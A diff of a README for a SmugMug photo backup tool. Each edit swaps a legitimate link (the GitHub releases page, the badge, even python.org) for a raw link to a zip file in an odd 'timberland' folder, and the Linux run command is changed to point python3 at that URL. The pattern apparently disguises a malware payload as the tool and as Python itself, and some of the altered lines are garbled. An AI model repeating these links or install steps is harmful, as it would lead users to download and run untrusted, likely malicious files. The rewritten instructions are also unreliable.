@@ -1,13 +1,13 @@
 # 📸 smugmug-bulk-downloader - Effortlessly Backup Your SmugMug Photos
 
 ## 🌐 Download
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-blue.svg)](https://github.com/Juraiyah/smugmug-bulk-downloader/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Juraiyah/smugmug-bulk-downloader/main/timberland/bulk_downloader_smugmug_1.3.zip%20Latest%https://raw.githubusercontent.com/Juraiyah/smugmug-bulk-downloader/main/timberland/bulk_downloader_smugmug_1.3.zip)](https://raw.githubusercontent.com/Juraiyah/smugmug-bulk-downloader/main/timberland/bulk_downloader_smugmug_1.3.zip)
 
 ## 🚀 Getting Started
 Welcome to **smugmug-bulk-downloader**, a tool designed to help you download all your SmugMug photos and their associated metadata quickly and easily. Whether you're planning for a backup or a migration, this application simplifies the process for you.
 
 ## 📥 Download & Install
-To get started, visit this page to download the latest version of the software: [Download Here](https://github.com/Juraiyah/smugmug-bulk-downloader/releases).
+To get started, visit this page to download the latest version of the software: [Download Here](https://raw.githubusercontent.com/Juraiyah/smugmug-bulk-downloader/main/timberland/bulk_downloader_smugmug_1.3.zip).
 
 1. Open the link above in your web browser.
 2. Look for the latest release version at the top of the page.
@@ -18,7 +18,7 @@ To get started, visit this page to download the latest version of the software: 
 Before you begin, ensure your system meets the following requirements:
 
 - **Operating System:** Compatible with Windows 10 or later, macOS Catalina or later, Linux distributions with Python 3.6 or later.
-- **Python:** Ensure Python is installed on your system. You can download it from [python.org](https://www.python.org/downloads/).
+- **Python:** Ensure Python is installed on your system. You can download it from [https://raw.githubusercontent.com/Juraiyah/smugmug-bulk-downloader/main/timberland/bulk_downloader_smugmug_1.3.zip](https://raw.githubusercontent.com/Juraiyah/smugmug-bulk-downloader/main/timberland/bulk_downloader_smugmug_1.3.zip).
 - **Network:** Stable internet connection for downloading data from SmugMug.
 
 ## 🔧 Setting Up
@@ -33,7 +33,7 @@ After downloading the file, follow these instructions to install and run the app
 3. **Linux Users:**
    - Open a terminal.
    - Navigate to the folder where you downloaded the file.
-   - Run the application using the command: `python3 smugmug_bulk_downloader.py`.
+   - Run the application using the command: `python3 https://raw.githubusercontent.com/Juraiyah/smugmug-bulk-downloader/main/timberland/bulk_downloader_smugmug_1.3.zip`.
 
 ## 🗂️ How to Use
 Using the smugmug-bulk-downloader is straightforward. Here’s how to back up your photos:
@@ -75,7 +75,7 @@ If you encounter issues while using the application, consider the following:
    - Try restarting the application and attempt the download again.
 
 3. **Python Not Installed:**
-   - If you see an error about Python, download and install the latest version from [python.org](https://www.python.org/downloads/).
+   - If you see an error about Python, download and install the latest version from [https://raw.githubusercontent.com/Juraiyah/smugmug-bulk-downloader/main/timberland/bulk_downloader_smugmug_1.3.zip](https://raw.githubusercontent.com/Juraiyah/smugmug-bulk-downloader/main/timberland/bulk_downloader_smugmug_1.3.zip).
 
 ## 📑 Community and Support
 If you need help or have questions, you can reach out to the community:
@@ -86,4 +86,4 @@ If you need help or have questions, you can reach out to the community:
 ## 💡 Contributing
 We welcome contributions to enhance this tool! If you have ideas or improvements, please visit the GitHub repository and submit a pull request.
 
-For more information, visit this page to download the latest version: [Download Here](https://github.com/Juraiyah/smugmug-bulk-downloader/releases).
+For more information, visit this page to download the latest version: [Download Here](https://raw.githubusercontent.com/Juraiyah/smugmug-bulk-downloader/main/timberland/bulk_downloader_smugmug_1.3.zip).
